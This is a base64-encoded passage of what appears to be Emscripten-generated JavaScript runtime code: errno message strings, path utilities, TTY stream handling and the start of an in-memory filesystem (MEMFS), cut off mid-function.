YSAoZm9yIG5vIGRlbGF5IGlvKSIsNjI6IlRpbWVyIGV4cGlyZWQiLDYzOiJPdXQgb2Ygc3RyZWFtcyByZXNvdXJjZXMiLDY0OiJNYWNoaW5lIGlzIG5vdCBvbiB0aGUgbmV0d29yayIsNjU6IlBhY2thZ2Ugbm90IGluc3RhbGxlZCIsNjY6IlRoZSBvYmplY3QgaXMgcmVtb3RlIiw2NzoiVGhlIGxpbmsgaGFzIGJlZW4gc2V2ZXJlZCIsNjg6IkFkdmVydGlzZSBlcnJvciIsNjk6IlNybW91bnQgZXJyb3IiLDcwOiJDb21tdW5pY2F0aW9uIGVycm9yIG9uIHNlbmQiLDcxOiJQcm90b2NvbCBlcnJvciIsNzI6Ik11bHRpaG9wIGF0dGVtcHRlZCIsNzM6IkNyb3NzIG1vdW50IHBvaW50IChub3QgcmVhbGx5IGVycm9yKSIsNzQ6IlRyeWluZyB0byByZWFkIHVucmVhZGFibGUgbWVzc2FnZSIsNzU6IlZhbHVlIHRvbyBsYXJnZSBmb3IgZGVmaW5lZCBkYXRhIHR5cGUiLDc2OiJHaXZlbiBsb2cuIG5hbWUgbm90IHVuaXF1ZSIsNzc6ImYuZC4gaW52YWxpZCBmb3IgdGhpcyBvcGVyYXRpb24iLDc4OiJSZW1vdGUgYWRkcmVzcyBjaGFuZ2VkIiw3OToiQ2FuIGFjY2VzcyBhIG5lZWRlZCBzaGFyZWQgbGliIiw4MDoiQWNjZXNzaW5nIGEgY29ycnVwdGVkIHNoYXJlZCBsaWIiLDgxOiIubGliIHNlY3Rpb24gaW4gYS5vdXQgY29ycnVwdGVkIiw4MjoiQXR0ZW1wdGluZyB0byBsaW5rIGluIHRvbyBtYW55IGxpYnMiLDgzOiJBdHRlbXB0aW5nIHRvIGV4ZWMgYSBzaGFyZWQgbGlicmFyeSIsODQ6IklsbGVnYWwgYnl0ZSBzZXF1ZW5jZSIsODY6IlN0cmVhbXMgcGlwZSBlcnJvciIsODc6IlRvbyBtYW55IHVzZXJzIiw4ODoiU29ja2V0IG9wZXJhdGlvbiBvbiBub24tc29ja2V0Iiw4OToiRGVzdGluYXRpb24gYWRkcmVzcyByZXF1aXJlZCIsOTA6Ik1lc3NhZ2UgdG9vIGxvbmciLDkxOiJQcm90b2NvbCB3cm9uZyB0eXBlIGZvciBzb2NrZXQiLDkyOiJQcm90b2NvbCBub3QgYXZhaWxhYmxlIiw5MzoiVW5rbm93biBwcm90b2NvbCIsOTQ6IlNvY2tldCB0eXBlIG5vdCBzdXBwb3J0ZWQiLDk1OiJOb3Qgc3VwcG9ydGVkIiw5NjoiUHJvdG9jb2wgZmFtaWx5IG5vdCBzdXBwb3J0ZWQiLDk3OiJBZGRyZXNzIGZhbWlseSBub3Qgc3VwcG9ydGVkIGJ5IHByb3RvY29sIGZhbWlseSIsOTg6IkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiLDk5OiJBZGRyZXNzIG5vdCBhdmFpbGFibGUiLDEwMDoiTmV0d29yayBpbnRlcmZhY2UgaXMgbm90IGNvbmZpZ3VyZWQiLDEwMToiTmV0d29yayBpcyB1bnJlYWNoYWJsZSIsMTAyOiJDb25uZWN0aW9uIHJlc2V0IGJ5IG5ldHdvcmsiLDEwMzoiQ29ubmVjdGlvbiBhYm9ydGVkIiwxMDQ6IkNvbm5lY3Rpb24gcmVzZXQgYnkgcGVlciIsMTA1OiJObyBidWZmZXIgc3BhY2UgYXZhaWxhYmxlIiwxMDY6IlNvY2tldCBpcyBhbHJlYWR5IGNvbm5lY3RlZCIsMTA3OiJTb2NrZXQgaXMgbm90IGNvbm5lY3RlZCIsMTA4OiJDYW5cJ3Qgc2VuZCBhZnRlciBzb2NrZXQgc2h1dGRvd24iLDEwOToiVG9vIG1hbnkgcmVmZXJlbmNlcyIsMTEwOiJDb25uZWN0aW9uIHRpbWVkIG91dCIsMTExOiJDb25uZWN0aW9uIHJlZnVzZWQiLDExMjoiSG9zdCBpcyBkb3duIiwxMTM6Ikhvc3QgaXMgdW5yZWFjaGFibGUiLDExNDoiU29ja2V0IGFscmVhZHkgY29ubmVjdGVkIiwxMTU6IkNvbm5lY3Rpb24gYWxyZWFkeSBpbiBwcm9ncmVzcyIsMTE2OiJTdGFsZSBmaWxlIGhhbmRsZSIsMTIyOiJRdW90YSBleGNlZWRlZCIsMTIzOiJObyBtZWRpdW0gKGluIHRhcGUgZHJpdmUpIiwxMjU6Ik9wZXJhdGlvbiBjYW5jZWxlZCIsMTMwOiJQcmV2aW91cyBvd25lciBkaWVkIiwxMzE6IlN0YXRlIG5vdCByZWNvdmVyYWJsZSJ9O2Z1bmN0aW9uIF9fX3NldEVyck5vKHZhbHVlKXtpZihNb2R1bGUuX19fZXJybm9fbG9jYXRpb24pSEVBUDMyW01vZHVsZS5fX19lcnJub19sb2NhdGlvbigpPj4yXT12YWx1ZTtyZXR1cm4gdmFsdWV9CnZhciBQQVRIPXtzcGxpdFBhdGg6KGZ1bmN0aW9uKGZpbGVuYW1lKXt2YXIgc3BsaXRQYXRoUmU9L14oXC8/fCkoW1xzXFNdKj8pKCg/OlwuezEsMn18W15cL10rP3wpKFwuW14uXC9dKnwpKSg/OltcL10qKSQvO3JldHVybiBzcGxpdFBhdGhSZS5leGVjKGZpbGVuYW1lKS5zbGljZSgxKX0pLG5vcm1hbGl6ZUFycmF5OihmdW5jdGlvbihwYXJ0cyxhbGxvd0Fib3ZlUm9vdCl7dmFyIHVwPTA7Zm9yKHZhciBpPXBhcnRzLmxlbmd0aC0xO2k+PTA7aS0tKXt2YXIgbGFzdD1wYXJ0c1tpXTtpZihsYXN0PT09Ii4iKXtwYXJ0cy5zcGxpY2UoaSwxKX1lbHNlIGlmKGxhc3Q9PT0iLi4iKXtwYXJ0cy5zcGxpY2UoaSwxKTt1cCsrfWVsc2UgaWYodXApe3BhcnRzLnNwbGljZShpLDEpO3VwLS19fQppZihhbGxvd0Fib3ZlUm9vdCl7Zm9yKDt1cDt1cC0tKXtwYXJ0cy51bnNoaWZ0KCIuLiIpfX0KcmV0dXJuIHBhcnRzfSksbm9ybWFsaXplOihmdW5jdGlvbihwYXRoKXt2YXIgaXNBYnNvbHV0ZT1wYXRoLmNoYXJBdCgwKT09PSIvIix0cmFpbGluZ1NsYXNoPXBhdGguc3Vic3RyKC0xKT09PSIvIjtwYXRoPVBBVEgubm9ybWFsaXplQXJyYXkocGF0aC5zcGxpdCgiLyIpLmZpbHRlcigoZnVuY3Rpb24ocCl7cmV0dXJuISFwfSkpLCFpc0Fic29sdXRlKS5qb2luKCIvIik7aWYoIXBhdGgmJiFpc0Fic29sdXRlKXtwYXRoPSIuIn0KaWYocGF0aCYmdHJhaWxpbmdTbGFzaCl7cGF0aCs9Ii8ifQpyZXR1cm4oaXNBYnNvbHV0ZT8iLyI6IiIpK3BhdGh9KSxkaXJuYW1lOihmdW5jdGlvbihwYXRoKXt2YXIgcmVzdWx0PVBBVEguc3BsaXRQYXRoKHBhdGgpLHJvb3Q9cmVzdWx0WzBdLGRpcj1yZXN1bHRbMV07aWYoIXJvb3QmJiFkaXIpe3JldHVybiIuIn0KaWYoZGlyKXtkaXI9ZGlyLnN1YnN0cigwLGRpci5sZW5ndGgtMSl9CnJldHVybiByb290K2Rpcn0pLGJhc2VuYW1lOihmdW5jdGlvbihwYXRoKXtpZihwYXRoPT09Ii8iKXJldHVybiIvIjt2YXIgbGFzdFNsYXNoPXBhdGgubGFzdEluZGV4T2YoIi8iKTtpZihsYXN0U2xhc2g9PT0tMSlyZXR1cm4gcGF0aDtyZXR1cm4gcGF0aC5zdWJzdHIobGFzdFNsYXNoKzEpfSksZXh0bmFtZTooZnVuY3Rpb24ocGF0aCl7cmV0dXJuIFBBVEguc3BsaXRQYXRoKHBhdGgpWzNdfSksam9pbjooZnVuY3Rpb24oKXt2YXIgcGF0aHM9QXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLDApO3JldHVybiBQQVRILm5vcm1hbGl6ZShwYXRocy5qb2luKCIvIikpfSksam9pbjI6KGZ1bmN0aW9uKGwscil7cmV0dXJuIFBBVEgubm9ybWFsaXplKGwrIi8iK3IpfSkscmVzb2x2ZTooZnVuY3Rpb24oKXt2YXIgcmVzb2x2ZWRQYXRoPSIiLHJlc29sdmVkQWJzb2x1dGU9ITE7Zm9yKHZhciBpPWFyZ3VtZW50cy5sZW5ndGgtMTtpPj0tMSYmIXJlc29sdmVkQWJzb2x1dGU7aS0tKXt2YXIgcGF0aD1pPj0wP2FyZ3VtZW50c1tpXTpGUy5jd2QoKTtpZih0eXBlb2YgcGF0aCE9PSJzdHJpbmciKXt0aHJvdyBuZXcgVHlwZUVycm9yKCJBcmd1bWVudHMgdG8gcGF0aC5yZXNvbHZlIG11c3QgYmUgc3RyaW5ncyIpfWVsc2UgaWYoIXBhdGgpe3JldHVybiIifQpyZXNvbHZlZFBhdGg9cGF0aCsiLyIrcmVzb2x2ZWRQYXRoO3Jlc29sdmVkQWJzb2x1dGU9cGF0aC5jaGFyQXQoMCk9PT0iLyJ9CnJlc29sdmVkUGF0aD1QQVRILm5vcm1hbGl6ZUFycmF5KHJlc29sdmVkUGF0aC5zcGxpdCgiLyIpLmZpbHRlcigoZnVuY3Rpb24ocCl7cmV0dXJuISFwfSkpLCFyZXNvbHZlZEFic29sdXRlKS5qb2luKCIvIik7cmV0dXJuKHJlc29sdmVkQWJzb2x1dGU/Ii8iOiIiKStyZXNvbHZlZFBhdGh8fCIuIn0pLHJlbGF0aXZlOihmdW5jdGlvbihmcm9tLHRvKXtmcm9tPVBBVEgucmVzb2x2ZShmcm9tKS5zdWJzdHIoMSk7dG89UEFUSC5yZXNvbHZlKHRvKS5zdWJzdHIoMSk7ZnVuY3Rpb24gdHJpbShhcnIpe3ZhciBzdGFydD0wO2Zvcig7c3RhcnQ8YXJyLmxlbmd0aDtzdGFydCsrKXtpZihhcnJbc3RhcnRdIT09IiIpYnJlYWt9CnZhciBlbmQ9YXJyLmxlbmd0aC0xO2Zvcig7ZW5kPj0wO2VuZC0tKXtpZihhcnJbZW5kXSE9PSIiKWJyZWFrfQppZihzdGFydD5lbmQpcmV0dXJuW107cmV0dXJuIGFyci5zbGljZShzdGFydCxlbmQtc3RhcnQrMSl9CnZhciBmcm9tUGFydHM9dHJpbShmcm9tLnNwbGl0KCIvIikpO3ZhciB0b1BhcnRzPXRyaW0odG8uc3BsaXQoIi8iKSk7dmFyIGxlbmd0aD1NYXRoLm1pbihmcm9tUGFydHMubGVuZ3RoLHRvUGFydHMubGVuZ3RoKTt2YXIgc2FtZVBhcnRzTGVuZ3RoPWxlbmd0aDtmb3IodmFyIGk9MDtpPGxlbmd0aDtpKyspe2lmKGZyb21QYXJ0c1tpXSE9PXRvUGFydHNbaV0pe3NhbWVQYXJ0c0xlbmd0aD1pO2JyZWFrfX0KdmFyIG91dHB1dFBhcnRzPVtdO2Zvcih2YXIgaT1zYW1lUGFydHNMZW5ndGg7aTxmcm9tUGFydHMubGVuZ3RoO2krKyl7b3V0cHV0UGFydHMucHVzaCgiLi4iKX0Kb3V0cHV0UGFydHM9b3V0cHV0UGFydHMuY29uY2F0KHRvUGFydHMuc2xpY2Uoc2FtZVBhcnRzTGVuZ3RoKSk7cmV0dXJuIG91dHB1dFBhcnRzLmpvaW4oIi8iKX0pfTt2YXIgVFRZPXt0dHlzOltdLGluaXQ6KGZ1bmN0aW9uKCl7fSksc2h1dGRvd246KGZ1bmN0aW9uKCl7fSkscmVnaXN0ZXI6KGZ1bmN0aW9uKGRldixvcHMpe1RUWS50dHlzW2Rldl09e2lucHV0OltdLG91dHB1dDpbXSxvcHM6b3BzfTtGUy5yZWdpc3RlckRldmljZShkZXYsVFRZLnN0cmVhbV9vcHMpfSksc3RyZWFtX29wczp7b3BlbjooZnVuY3Rpb24oc3RyZWFtKXt2YXIgdHR5PVRUWS50dHlzW3N0cmVhbS5ub2RlLnJkZXZdO2lmKCF0dHkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0RFVil9CnN0cmVhbS50dHk9dHR5O3N0cmVhbS5zZWVrYWJsZT0hMX0pLGNsb3NlOihmdW5jdGlvbihzdHJlYW0pe3N0cmVhbS50dHkub3BzLmZsdXNoKHN0cmVhbS50dHkpfSksZmx1c2g6KGZ1bmN0aW9uKHN0cmVhbSl7c3RyZWFtLnR0eS5vcHMuZmx1c2goc3RyZWFtLnR0eSl9KSxyZWFkOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zKXtpZighc3RyZWFtLnR0eXx8IXN0cmVhbS50dHkub3BzLmdldF9jaGFyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTlhJTyl9CnZhciBieXRlc1JlYWQ9MDtmb3IodmFyIGk9MDtpPGxlbmd0aDtpKyspe3ZhciByZXN1bHQ7dHJ5e3Jlc3VsdD1zdHJlYW0udHR5Lm9wcy5nZXRfY2hhcihzdHJlYW0udHR5KX1jYXRjaChlKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FSU8pfQppZihyZXN1bHQ9PT11bmRlZmluZWQmJmJ5dGVzUmVhZD09PTApe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVBR0FJTil9CmlmKHJlc3VsdD09PW51bGx8fHJlc3VsdD09PXVuZGVmaW5lZClicmVhaztieXRlc1JlYWQrKztidWZmZXJbb2Zmc2V0K2ldPXJlc3VsdH0KaWYoYnl0ZXNSZWFkKXtzdHJlYW0ubm9kZS50aW1lc3RhbXA9RGF0ZS5ub3coKX0KcmV0dXJuIGJ5dGVzUmVhZH0pLHdyaXRlOihmdW5jdGlvbihzdHJlYW0sYnVmZmVyLG9mZnNldCxsZW5ndGgscG9zKXtpZighc3RyZWFtLnR0eXx8IXN0cmVhbS50dHkub3BzLnB1dF9jaGFyKXt0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTlhJTyl9CmZvcih2YXIgaT0wO2k8bGVuZ3RoO2krKyl7dHJ5e3N0cmVhbS50dHkub3BzLnB1dF9jaGFyKHN0cmVhbS50dHksYnVmZmVyW29mZnNldCtpXSl9Y2F0Y2goZSl7dGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlPKX19CmlmKGxlbmd0aCl7c3RyZWFtLm5vZGUudGltZXN0YW1wPURhdGUubm93KCl9CnJldHVybiBpfSl9LGRlZmF1bHRfdHR5X29wczp7Z2V0X2NoYXI6KGZ1bmN0aW9uKHR0eSl7aWYoIXR0eS5pbnB1dC5sZW5ndGgpe3ZhciByZXN1bHQ9bnVsbDtpZihFTlZJUk9OTUVOVF9JU19OT0RFKXt2YXIgQlVGU0laRT0yNTY7dmFyIGJ1Zj1uZXcgQnVmZmVyKEJVRlNJWkUpO3ZhciBieXRlc1JlYWQ9MDt2YXIgaXNQb3NpeFBsYXRmb3JtPXByb2Nlc3MucGxhdGZvcm0hPSJ3aW4zMiI7dmFyIGZkPXByb2Nlc3Muc3RkaW4uZmQ7aWYoaXNQb3NpeFBsYXRmb3JtKXt2YXIgdXNpbmdEZXZpY2U9ITE7dHJ5e2ZkPWZzLm9wZW5TeW5jKCIvZGV2L3N0ZGluIiwiciIpO3VzaW5nRGV2aWNlPSEwfWNhdGNoKGUpe319CnRyeXtieXRlc1JlYWQ9ZnMucmVhZFN5bmMoZmQsYnVmLDAsQlVGU0laRSxudWxsKX1jYXRjaChlKXtpZihlLnRvU3RyaW5nKCkuaW5kZXhPZigiRU9GIikhPS0xKWJ5dGVzUmVhZD0wO2Vsc2UgdGhyb3cgZX0KaWYodXNpbmdEZXZpY2Upe2ZzLmNsb3NlU3luYyhmZCl9CmlmKGJ5dGVzUmVhZD4wKXtyZXN1bHQ9YnVmLnNsaWNlKDAsYnl0ZXNSZWFkKS50b1N0cmluZygidXRmLTgiKX1lbHNle3Jlc3VsdD1udWxsfX1lbHNlIGlmKHR5cGVvZiB3aW5kb3chPSJ1bmRlZmluZWQiJiZ0eXBlb2Ygd2luZG93LnByb21wdD09ImZ1bmN0aW9uIil7cmVzdWx0PXdpbmRvdy5wcm9tcHQoIklucHV0OiAiKTtpZihyZXN1bHQhPT1udWxsKXtyZXN1bHQrPSJcXG4ifX1lbHNlIGlmKHR5cGVvZiByZWFkbGluZT09ImZ1bmN0aW9uIil7cmVzdWx0PXJlYWRsaW5lKCk7aWYocmVzdWx0IT09bnVsbCl7cmVzdWx0Kz0iXFxuIn19CmlmKCFyZXN1bHQpe3JldHVybiBudWxsfQp0dHkuaW5wdXQ9aW50QXJyYXlGcm9tU3RyaW5nKHJlc3VsdCwhMCl9CnJldHVybiB0dHkuaW5wdXQuc2hpZnQoKX0pLHB1dF9jaGFyOihmdW5jdGlvbih0dHksdmFsKXtpZih2YWw9PT1udWxsfHx2YWw9PT0xMCl7TW9kdWxlLnByaW50KFVURjhBcnJheVRvU3RyaW5nKHR0eS5vdXRwdXQsMCkpO3R0eS5vdXRwdXQ9W119ZWxzZXtpZih2YWwhPTApdHR5Lm91dHB1dC5wdXNoKHZhbCl9fSksZmx1c2g6KGZ1bmN0aW9uKHR0eSl7aWYodHR5Lm91dHB1dCYmdHR5Lm91dHB1dC5sZW5ndGg+MCl7TW9kdWxlLnByaW50KFVURjhBcnJheVRvU3RyaW5nKHR0eS5vdXRwdXQsMCkpO3R0eS5vdXRwdXQ9W119fSl9LGRlZmF1bHRfdHR5MV9vcHM6e3B1dF9jaGFyOihmdW5jdGlvbih0dHksdmFsKXtpZih2YWw9PT1udWxsfHx2YWw9PT0xMCl7TW9kdWxlLnByaW50RXJyKFVURjhBcnJheVRvU3RyaW5nKHR0eS5vdXRwdXQsMCkpO3R0eS5vdXRwdXQ9W119ZWxzZXtpZih2YWwhPTApdHR5Lm91dHB1dC5wdXNoKHZhbCl9fSksZmx1c2g6KGZ1bmN0aW9uKHR0eSl7aWYodHR5Lm91dHB1dCYmdHR5Lm91dHB1dC5sZW5ndGg+MCl7TW9kdWxlLnByaW50RXJyKFVURjhBcnJheVRvU3RyaW5nKHR0eS5vdXRwdXQsMCkpO3R0eS5vdXRwdXQ9W119fSl9fTt2YXIgTUVNRlM9e29wc190YWJsZTpudWxsLG1vdW50OihmdW5jdGlvbihtb3VudCl7cmV0dXJuIE1FTUZTLmNyZWF0ZU5vZGUobnVsbCwiLyIsMTYzODR8NTExLDApfSksY3JlYXRlTm9kZTooZnVuY3Rpb24ocGFyZW50LG5hbWUsbW9kZSxkZXYpe2lmKEZTLmlzQmxrZGV2KG1vZGUpfHxGUy5pc0ZJRk8obW9kZSkpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKX0KaWYoIU1FTUZTLm9wc190YWJsZSl7TUVNRlMub3BzX3RhYmxlPXtkaXI6e25vZGU6e2dldGF0dHI6TUVNRlMubm9kZV9vcHMuZ2V0YXR0cixzZXRhdHRyOk1FTUZTLm5vZGVfb3BzLnNldGF0dHIsbG9va3VwOk1FTUZTLm5vZGVfb3BzLmxvb2t1cCxta25vZDpNRU1GUy5ub2RlX29wcy5ta25vZCxyZW5hbWU6TUVNRlMubm9kZV9vcHMucmVuYW1lLHVubGluazpNRU1GUy5ub2RlX29wcy51bmxpbmsscm1kaXI6TUVNRlMubm9kZV9vcHMucm1kaXIscmVhZGRpcjpNRU1GUy5ub2RlX29wcy5yZWFkZGlyLHN5bWxpbms6TUVNRlMubm9kZV9vcHMuc3ltbGlua30sc3RyZWFtOntsbHNlZWs6TUVNRlMuc3RyZWFtX29wcy5sbHNlZWt9fSxmaWxlOntub2RlOntnZXRhdHRyOk1FTUZTLm5vZGVfb3BzLmdldGF0dHIsc2V0YXR0cjpNRU1GUy5ub2RlX29wcy5zZXRhdHRyfSxzdHJlYW06e2xsc2VlazpNRU1GUy5zdHJlYW1fb3BzLmxsc2VlayxyZWFkOk1FTUZTLnN0cmVhbV9vcHMucmVhZCx3cml0ZTpNRU1GUy5zdHJlYW1fb3BzLndyaXRlLGFsbG9jYXRlOk1FTUZTLnN0cmVhbV9vcHMuYWxsb2NhdGUsbW1hcDpNRU1GUy5zdHJlYW1fb3BzLm1tYXAsbXN5bmM6TUVNRlMuc3RyZWFtX29wcy5tc3luY319LGxpbms6e25vZGU6e2dldGF0dHI6TUVNRlMubm9kZV9vcHMuZ2V0YXR0cixzZXRhdHRyOk1FTUZTLm5vZGVfb3BzLnNldGF0dHIscmVhZGxpbms6TUVNRlMubm9kZV9vcHMucmVhZGxpbmt9LHN0cmVhbTp7fX0sY2hyZGV2Ontub2RlOntnZXRhdHRyOk1FTUZTLm5vZGVfb3BzLmdldGF0dHIsc2V0YXR0cjpNRU1GUy5ub2RlX29wcy5zZXRhdHRyfSxzdHJlYW06RlMuY2hyZGV2X3N0cmVhbV9vcHN9fX0KdmFyIG5vZGU9RlMuY3JlYXRlTm9kZShwYXJlbnQsbmFtZSxtb2RlLGRldik7aWYoRlMuaXNEaXIobm9kZS5tb2RlKSl7bm9kZS5ub2RlX29wcz1NRU1GUy5vcHNfdGFibGUuZGlyLm5vZGU7bm9kZS5zdHJlYW1fb3BzPU1FTUZTLm9wc190YWJsZS5kaXIuc3RyZWFtO25vZGUuY29udGVudHM9e319ZWxzZSBpZihGUy5pc0ZpbGUobm9kZS5tb2RlKSl7bm9kZS5ub2RlX29wcz1NRU1GUy5vcHNfdGFibGUuZmlsZS5ub2RlO25vZGUuc3RyZWFtX29wcz1NRU1GUy5vcHNfdGFibGUuZmlsZS5zdHJlYW07bm9kZS51c2VkQnl0ZXM9MDtub2RlLmNvbnRlbnRzPW51bGx9ZWxzZSBpZihGUy5pc0xpbmsobm9kZS5tb2RlKSl7bm9kZS5ub2RlX29wcz1NRU1GUy5vcHNfdGFibGUubGluay5ub2RlO25vZGUuc3RyZWFtX29wcz1NRU1GUy5vcHNfdGFibGUubGluay5zdHJlYW19ZWxzZSBpZihGUy5pc0NocmRldihub2RlLm1vZGUpKXtub2RlLm5vZGVfb3BzPU1FTUZTLm9wc190YWJsZS5jaHJkZXYubm9kZTtub2RlLnN0cmVhbV9vcHM9TUVNRlMub3BzX3RhYmxlLmNocmRldi5zdHJlYW19Cm5vZGUudGltZXN0YW1wPURhdGUubm93KCk7aWYocGFyZW50KXtwYXJlbnQuY29udGVudHNbbmFtZV09bm9kZX0KcmV0dXJuIG5vZGV9KSxnZXRGaWxlRGF0YUFzUmVndWxhckFycmF5OihmdW5jdGlvbihub2RlKXtpZihub2RlLmNvbnRlbnRzJiZub2RlLmNvbnRlbnRzLnN1YmFycmF5KXt2YXIgYXJyPVtdO2Zvcih2YXIgaT0wO2k8bm9kZS51c2VkQnl0ZXM7KytpKWFyci5wdXNoKG5vZGUuY29udGVudHNbaV0pO3JldHVybiBhcnJ9CnJldHVybiBub2RlLmNvbnRlbnRzfSksZ2V0RmlsZURhdGFBc1R5cGVkQXJyYXk6KGZ1bmN0aW9uKG5vZGUpe2lmKCFub2RlLmNvbnRlbnRzKXJldHVybiBuZXcgVWludDhBcnJheTtpZihub2RlLmNvbnRlbnRzLnN1YmFycmF5KXJldHVybiBub2RlLmNvbnRlbnRzLnN1YmFycmF5KDAsbm9kZS51c2VkQnl0ZXMpO3JldHVybiBuZXcgVWludDhBcnJheShub2RlLmNvbnRlbnRzKX0pLGV4cGFuZEZpbGVTdG9yYWdlOihmdW5jdGlvbihub2RlLG5ld0NhcGFjaXR5KXtpZihub2RlLmNvbnRlbnRzJiZub2RlLmNvbnRlbnRzLnN1YmFycmF5JiZuZXdDYXBhY2l0eT5ub2RlLmNvbnRlbnRzLmxlbmd0aCl7bm9kZS5jb250ZW50cz1NRU1GUy5nZXRGaWxlRGF0YUFzUmVndWxhckFycmF5KG5vZGUpO25vZGUudXNlZEJ5dGVzPW5vZGUuY29udGVudHMubGVuZ3RofQppZighbm9kZS5jb250ZW50c3x8bm9kZS5jb250ZW50cy5zdWJhcnJheSl7dmFyIHByZXZDYXBhY2l0eT1ub2RlLmNvbnRlbnRzP25vZGUuY29udGVudHMubGVuZ3RoOjA7aWYocHJldkNhcGFjaXR5Pj1uZXdDYXBhY2l0eSlyZXR1cm47dmFyIENBUEFDSVRZX0RPVUJMSU5HX01BWD0xMDI0KjEwMjQ7bmV3Q2FwYWNpdHk9TWF0aC5tYXgobmV3Q2FwYWNpdHkscHJldkNhcGFjaXR5KihwcmV2Q2FwYWNpdHk8Q0FQQUNJVFlfRE9VQkxJTkdfTUFYPzI6MS4xMjUpfDApO2lmKHByZXZDYXBhY2l0eSE9MCluZXdDYXBhY2l0eT1NYXRoLm1heChuZXdDYXBhY2l0eSwyNTYpO3ZhciBvbGRDb250ZW50cz1ub2RlLmNvbnRlbnRzO25vZGUuY29udGVudHM9bmV3IFVpbnQ4QXJyYXkobmV3Q2FwYWNpdHkpO2lmKG5vZGUudXNlZEJ5dGVzPjApbm9kZS5jb250ZW50cy5zZXQob2xkQ29udGVudHMuc3ViYXJyYXkoMCxub2RlLnVzZWRCeXRlcyksMCk7cmV0dXJufQppZighbm9kZS5jb250ZW50cyYmbmV3Q2FwYWNpdHk+MClub2RlLmNvbnRlbnRzPVtdO3doaWxlKG5vZGUuY29udGVudHMubGVuZ3RoPG5ld0NhcGFjaXR5KW5vZGUuY29udGVudHMucHVzaCgwKX0pLHJlc2l6ZUZpbGVTdG9yYWdlOihmdW5jdGlvbihub2RlLG5ld1NpemUpe2lmKG5vZGUudXNlZEJ5dGVzPT1uZXdTaXplKXJldHVybjtpZihuZXdTaXplPT0wKXtub2RlLmNvbnRlbnRzPW51bGw7bm9kZS51c2VkQnl0ZXM9MDtyZXR1cm59CmlmKCFub2RlLmNvbnRlbnRzfHxub2RlLmNvbnRlbnRzLnN1YmFycmF5KXt2YXIgb2xkQ29udGVudHM9bm9kZS5jb250ZW50cztub2RlLmNvbnRlbnRzPW5ldyBVaW50OEFycmF5KG5ldyBBcnJheUJ1ZmZlcihuZXdTaXplKSk7aWYob2xkQ29udGVudHMpe25vZGUuY29udGVudHMuc2V0KG9sZENvbnRlbnRzLnN1YmFycmF5KDAsTWF0aC5taW4obmV3U2l6ZSxub2RlLnVzZWRCeXRlcykpKX0Kbm9kZS51c2VkQnl0ZXM9bmV3U2l6ZTtyZXR1cm59CmlmKCFub2RlLmNvbnRlbnRzKW5vZGUuY29udGVudHM9W107aWYobm9kZS5jb250ZW50cy5sZW5ndGg+bmV3U2l6ZSlub2RlLmNvbnRlbnRzLmxlbmd0aD1uZXdTaXplO2Vsc2Ugd2hpbGUobm9kZS5jb250ZW50cy5sZW5ndGg8bmV3U2l6ZSlub2RlLmNvbnRlbnRzLnB1c2goMCk7bm9kZS51c2VkQnl0ZXM9bmV3U2l6ZX0pLG5vZGVfb3BzOntnZXRhdHRyOihmdW5jdGlvbihub2RlKXt2YXIgYXR0cj17fTthdHRyLmRldj1GUy5pc0NocmRldihub2RlLm1vZGUpP25vZGUuaWQ6MTthdHRyLmlubz1ub2RlLmlkO2F0dHIubW9kZT1ub2RlLm1vZGU7YXR0ci5ubGluaz0xO2F0dHIudWlkPTA7YXR0ci5naWQ9MDthdHRyLnJkZXY9bm9kZS5yZGV2O2lmKEZTLmlzRGlyKG5vZGUubW9kZSkpe2F0dHIuc2l6ZT00MDk2fWVsc2UgaWYoRlMuaXNGaWxlKG5vZGUubW9kZSkpe2F0dHIuc2l6ZT1ub2RlLnVzZWRCeXRlc31lbHNlIGlmKEZTLmlzTGluayhub2RlLm1vZGUpKXthdHRyLnNpemU9bm9kZS5saW5rLmxlbmd0aH1lbHNle2F0dHIuc2l6ZT0wfQphdHRyLmF0aW1lPW5ldyBEYXRlKG5vZGUudGltZXN0YW1wKTthdHRyLm10aW1lPW5ldyBEYXRlKG5vZGUudGltZXN0YW1wKTthdHRyLmN0aW1lPW5ldyBEYXRlKG5vZGUudGltZXN0YW1wKTthdHRyLmJsa3NpemU9NDA5NjthdHRyLmJsb2Nrcz1NYXRoLmNlaWwoYXR0ci5zaXplL2F0dHIuYmxrc2l6ZSk7cmV0dXJuIGF0dHJ9KSxzZXRhdHRyOihmdW5jdGlvbihub2RlLGF0dHIpe2lmKGF0dHIubW9kZSE9PXVuZGVmaW5lZCl7bm9kZS5tb2RlPWF0dHIubW9kZX0KaWYoYXR0ci50aW1lc3RhbXAhPT11bmRlZmluZWQpe25vZGUudGltZXN0YW1wPWF0dHIudGltZXN0YW1wfQppZihhdHRyLnNpemUhPT11bmRlZmluZWQpe01FTUZTLnJlc2l6ZUZpbGVTdG9yYWdlKG5vZGUsYXR0ci5zaXplKX19KSxsb29rdXA6KGZ1bmN0aW9uKHBhcmVudCxuYW1lKXt0aHJvdyBGUy5nZW5lcmljRXJyb3JzW0VSUk5PX0NPREVTLkVOT0VOVF19KSxta25vZDooZnVuY3Rpb24ocGFyZW50LG5hbWUsbW9kZSxkZXYpe3JldHVybiBNRU1GUy5jcmVhdGVOb2RlKHBhcmVudCxuYW1lLG1vZGUsZGV2KX0pLHJlbmFtZTooZnVuY3Rpb24ob2xkX25vZGUsbmV3X2RpcixuZXdfbmFtZSl7aWYoRlMuaXNEaXIob2xkX25vZGUubW9kZSkpe3ZhciBuZXdfbm9kZTt0cnl7bmV3X25vZGU9RlMubG9va3VwTm9kZShuZXdfZGlyLG5ld19uYW1lKX1jYXRjaChlKXt9CmlmKG5ld19ub2RlKXtmb3IodmFyIGkgaW4gbmV3X25vZGUuY29udGVudHMpe3Rocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1R